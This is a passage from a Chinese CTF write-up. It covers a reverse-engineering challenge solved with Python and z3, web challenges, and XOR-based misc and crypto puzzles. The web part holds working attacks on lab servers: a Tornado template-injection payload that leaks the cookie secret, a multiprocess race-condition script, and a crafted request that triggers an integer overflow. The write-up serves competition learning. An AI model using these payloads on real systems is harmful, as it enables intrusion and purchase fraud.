        print 'sub %s(%x),%s(%x) = %x'%(op2,v4,op1,v3,v4-v3)
        eip += 2
    def inc_eip():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        print 'inc_eip called'
        eip += 1
    def vm():
        global eax,ecx,edx,ebx,zflag,input,stack,eip,opcode,index
        while True:
            if opcode[eip]==0x43:
                return
            elif opcode[eip] == 0x44:
                jmpback()
            elif opcode[eip] == 0x45:
                mod()
            elif opcode[eip] == 0x46:
                movinput()
            elif opcode[eip] == 0x47:
                xor()
            elif opcode[eip] == 0x48:
                cmp()
            elif opcode[eip] == 0x49:
                inc_input()
            elif opcode[eip] == 0x4a:
                v_and()
            elif opcode[eip] == 0x4b:
                notequaljmp()
            elif opcode[eip] == 0x4c:
                xor66()
            elif opcode[eip] == 0x4d:
                equaljmp()
            elif opcode[eip] == 0x4e:
                dec()
            elif opcode[eip] == 0x4f:
                pushimm()
            elif opcode[eip] == 0x50:
                inc()
            elif opcode[eip] == 0x51:
                v_mov()
            elif opcode[eip] == 0x52:
                pushreg()
            elif opcode[eip] == 0x53:
                add()
            elif opcode[eip] == 0x54:
                popreg()
            elif opcode[eip] == 0x55:
                jmpupper()
            elif opcode[eip] == 0x56:
                dec_input()
            elif opcode[eip] == 0x57:
                reg2input()
            elif opcode[eip] == 0x58:
                mul()
            elif opcode[eip] == 0x59:
                sub()
            else:
                eip += 1
    vm()
    print l
### APM233
题目共有四个level,同时题目中包含大量的混淆与try catch，逆向起来非常恶心
level 1，简单比较，将输入与程序内置的字符串进行比较，值为 1d2e3c4a  
level 2， 将输入通过sscanf("%x")进行输入，置入Dr0~3中，在程序中使用多项式运算进行check，多项式如下  
Dr0 + Dr1 = 0x899a9d9c  
Dr1 + Dr2 = 0x797aa9ab  
Dr2 + Dr3 = 0x272885bc  
Dr3 - Dr0 = 0xf0e0fbcf  
最终计算结果为 efbe3323adde6666feca1313beba1414  
level 3，
检测程序是否处于被调试状态以及是否在虚拟机中运行，比较的目标字符串的值与调试状态以及是否在虚拟机中有关，从中筛选出正确的值以及不断的尝试，得到level3的结果为
0acb7935481efc12
level 4， 最后一关为一个小游戏，玩家与三个AI进行游戏，要求玩家的位置不能与三个AI重合，玩家每次的可走的步数为1-4，AI的行动路线如下所示  
a1 = [4, -1, 6, -1, 3, 2, 4, 1, 3, -1, 5, 1, 2, -1, 5, 1, 3, -2, 7, 0, 2, 3,
5, 0, 5, 0, 5, 2, 1, -2, 6, -1, 3, 3, 4, 0, 5, -1, 6, 0, 4, 0, 7, 0, 5, -2, 7,
2, 2, -1, 6, 2, 2, 1, 5, 0, 2, 0, 3, 0, 4, 0, 6, -1, 5, 0, 5, 3, 0, 5, 3, 2]  
a2 = [2, 2, 3, 3, 3, -2, 7, 1, 1, 1, 5, 1, 0, 2, 5, 1, 0, 0, 4, 0, 7, 2, 2, 0,
4, 1, 3, 4, 0, 1, 6, -1, 5, -1, 3, 5, 1, 2, 5, 0, 5, 0, 2, 5, 1, 1, 5, 2, 2,
1, 2, 3, 5, -1, 4, 1, 2, -1, 7, 1, 2, 2, 1, 2, 5, 0, 5, 0, 5, -1, 3, 2]  
a3 = [3, -1, 6, -1, 5, 0, 4, 0, 2, 5, 0, 5, 1, -1, 5, 1, 0, 2, 4, 0, 5, 0, 4,
0, 6, -1, 6, 1, 2, 1, 3, 3, 2, 3, 3, 0, 5, -1, 4, 0, 6, 0, 5, 0, 5, 1, 2, 2,
3, 0, 5, 5, 0, 0, 6, 2, -1, 1, 5, 1, 0, 3, 4, -1, 4, 5, 0, 2, 5, 1, 4, 1]  
通过上述规则，可以得到玩家的路线为  
[1, 4, 1, 3, 1, 4, 1, 2, 2, 3, 2, 1, 1, 4, 1, 1, 1, 4, 1, 4, 2, 3, 1, 4, 1, 4,
2, 1, 1, 4, 1, 3, 2, 3, 2, 3, 1, 4, 1, 4, 1, 4, 2, 3, 1, 4, 2, 2, 1, 4, 3, 2,
1, 4, 1, 1, 1, 4, 1, 2, 2, 3, 1, 4, 2, 3, 2, 3, 2, 3, 2, 3]  
玩家的行动由输入b64encode后再将编码后的结果拆为两两一组  
由下面的代码可以讲上面的路线逆向为用户应有的输入（路线需要全部-1）
    b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    ans = ''
    for i in xrange(0,len(choice),3):
        t = (choice[i]<<4) + (choice[i+1]<<2) + choice[i+2]
        print t,
        ans+=b64[t]
    print 
    print ans
    print b64decode(ans)
最终得到结果 21d03c42f365901cff
全部输入给程序得到flag为 flag{N0t_d1ff1cul7_r1ght?_3d34e}
level2 与 level4 的脚本如下：
    from z3 import *
    from pwn import *
    from base64 import b64decode,b64encode
    def level2():
        s = Solver()
        Dr0 = BitVec('Dr0',32)
        Dr1 = BitVec('Dr1',32)
        Dr2 = BitVec('Dr2',32)
        Dr3 = BitVec('Dr3',32)
        s.add(Dr0 + Dr1 == 0x899a9d9c)
        s.add(Dr1 + Dr2 == 0x797aa9ab)
        s.add(Dr2 + Dr3 == 0x272885bc)
        s.add(Dr3 - Dr0 == 0xf0e0fbcf)
        print s.check()
        m = s.model()
        Dr0 = int('%s'%m[Dr0])
        Dr1 = int('%s'%m[Dr1])
        Dr2 = int('%s'%m[Dr2])
        Dr3 = int('%s'%m[Dr3])
        ans = '%s%s%s%s'%(p32(Dr0).encode('hex'),p32(Dr1).encode('hex'),p32(Dr2).encode('hex'),p32(Dr3).encode('hex'))
        print ans
    def level4():
        a1 = [4, -1, 6, -1, 3, 2, 4, 1, 3, -1, 5, 1, 2, -1, 5, 1, 3, -2, 7, 0, 2, 3, 5, 0, 5, 0, 5, 2, 1, -2, 6, -1, 3, 3, 4, 0, 5, -1, 6, 0, 4, 0, 7, 0, 5, -2, 7, 2, 2, -1, 6, 2, 2, 1, 5, 0, 2, 0, 3, 0, 4, 0, 6, -1, 5, 0, 5, 3, 0, 5, 3, 2]
        a2 = [2, 2, 3, 3, 3, -2, 7, 1, 1, 1, 5, 1, 0, 2, 5, 1, 0, 0, 4, 0, 7, 2, 2, 0, 4, 1, 3, 4, 0, 1, 6, -1, 5, -1, 3, 5, 1, 2, 5, 0, 5, 0, 2, 5, 1, 1, 5, 2, 2, 1, 2, 3, 5, -1, 4, 1, 2, -1, 7, 1, 2, 2, 1, 2, 5, 0, 5, 0, 5, -1, 3, 2]
        a3 = [3, -1, 6, -1, 5, 0, 4, 0, 2, 5, 0, 5, 1, -1, 5, 1, 0, 2, 4, 0, 5, 0, 4, 0, 6, -1, 6, 1, 2, 1, 3, 3, 2, 3, 3, 0, 5, -1, 4, 0, 6, 0, 5, 0, 5, 1, 2, 2, 3, 0, 5, 5, 0, 0, 6, 2, -1, 1, 5, 1, 0, 3, 4, -1, 4, 5, 0, 2, 5, 1, 4, 1]
        pos1 = 0
        pos2 = 0
        pos3 = 0
        pos4 = 0
        choice = []
        for i in range(len(a1)):
            pos1 += a1[i]
            pos2 += a2[i]
            pos3 += a3[i]
            if (pos4 + 4 != pos1) and (pos4 + 4 != pos2) and (pos4 + 4 != pos3):
                t = 4
            elif (pos4 + 3 != pos1) and (pos4 + 3 != pos2) and (pos4 + 3 != pos3):
                t = 3
            elif (pos4 + 2 != pos1) and (pos4 + 2 != pos2) and (pos4 + 2 != pos3):
                t = 2
            else:
                t = 1
            pos4 += t
            choice.append(t-1)
        print choice
        b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        print choice
        ans = ''
        for i in xrange(0,len(choice),3):
            t = (choice[i]<<4) + (choice[i+1]<<2) + choice[i+2]
            print t,
            ans+=b64[t]
        print 
        print ans
        print b64decode(ans)
    # level1 1d2e3c4a
    level2()    # efbe3323adde6666feca1313beba1414
    # level3 0acb7935481efc12
    level4()    # 21d03c42f365901cff
    # flag{N0t_d1ff1cul7_r1ght?_3d34e}
## Web
### easy tornado
报错的地方存在模板注入
    http://117.78.27.209:32354/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF
过滤了一堆字符，发现hander可以用，然后读取settings，secret_cookie即可拿到
    {{handler.settings}}
然后`md5(cookie_secret + md5(filename))`算出`/fllllllllllag`的hash即可
### ltshop
购买大辣条的时候存在竞争，可以购买多于5个的大辣条, 买了它20个，够用了
    import multiprocessing
    from requests.exceptions import RequestException
    from requests.adapters import HTTPAdapter
    import re, os, json, requests, time
    import traceback
    def main():
        url = 'http://117.78.26.155:31358/buylt'
        cookie = '47c3b1ec-45d1-4b19-9bec-025a67e203b6'
        headers = {'Cookie':'go_iris_cookie='+ cookie}
        k = requests.post(url,headers=headers)
        print k.content
    if __name__ == '__main__':
        results = []
        pool = multiprocessing.Pool(processes=20)
        for i in range(0xff):
            results.append(pool.apply_async(main,))
        pool.close()
        pool.join()
5个大辣条可以换一个超级大辣条
golang的Web应用
购买超级大辣条的时候存在uint64整型溢出
    uint8  : 0 to 255 
    uint16 : 0 to 65535 
    uint32 : 0 to 4294967295 
    uint64 : 0 to 18446744073709551615 
    int8   : -128 to 127 
    int16  : -32768 to 32767 
    int32  : -2147483648 to 2147483647 
    int64  : -9223372036854775808 to 9223372036854775807
购买 18446744073709551615/5 + 1 个超级大辣条
    POST /buyltw HTTP/1.1
    Host: 117.78.26.155:31358
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:45.0) Gecko/20100101 Firefox/45.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Referer: http://117.78.26.155:31358/home
    Content-Length: 26
    Cookie: go_iris_cookie=47c3b1ec-45d1-4b19-9bec-025a67e203b6
    X-Forwarded-For: 127.0.0.1
    Connection: close
    number=3689348814741910324
然后购买flag即可
### easy web
## Misc
### 迟来的签到题
给了一传base64编码的字符串，提示是xor。  
先base64decode，再爆破i，i满足对字符串每个字符异或后，是flag。
    a = 'AAoHAR1XICMnIlBfUlRXXyBXJFRSUCRRI1RSJyQkIlYgU1EjURs='
    b = a.decode('base64')
    for i in range(256):
        print i,'---',
        for k in b:
            print chr(ord(k)^i),
        print ''
    #print b
flag{1FEAD694219F1B246B7E24ABBD0F57E7}
## Crypto
### FEZ
一个与xor的题，注意：a ^ a = 0  
大体思路是，理清楚六次循环后，字符串变成什么样子
原字符串为  
a，b  
经过三次变换后变为  
ca，db  
六次变换后  
ca，db  
七次后  
xb，yab
解码就可以得到x，y
再代入原式中，解得flag
    def xor(a,b):
        assert len(a)==len(b)
        c=""
        for i in range(len(a)):
            c+=chr(ord(a[i])^ord(b[i]))
        return c
    test = '0b7361c8143e5935f9f5be3949cc07ed7a5ba6f258ebd91f29c5a7d16976f8dfb7fa422a6167281e573d015cc6d995841d5cab07923c'.decode("hex")
    test_K_result = 'f46d9ffa6a28a3fc2aa17c244ec29fc6a7bf5cac0da4489ad53782f1ef66597dc2928517b56693347ad468154e6f0f1ff8501fa6a1b1'.decode("hex")
    m_K_result = '44668860d4e23030bd4a0981530bc1d6da1a20f821aa51941258862cfb716cac503d0f0dcec150171aecfe4d86839f346ff26f2a6a70'.decode("hex")
    L = test[:27]
    R = test[27:54]
    k_l = xor(R, test_K_result[:27])
    k_r = xor(L,xor(R, test_K_result[27:54]))
    result_r = xor(k_l, m_K_result[:27])
    result_l = xor(result_r, xor(k_r, m_K_result[27:54]))
    print result_l, result_r[:10]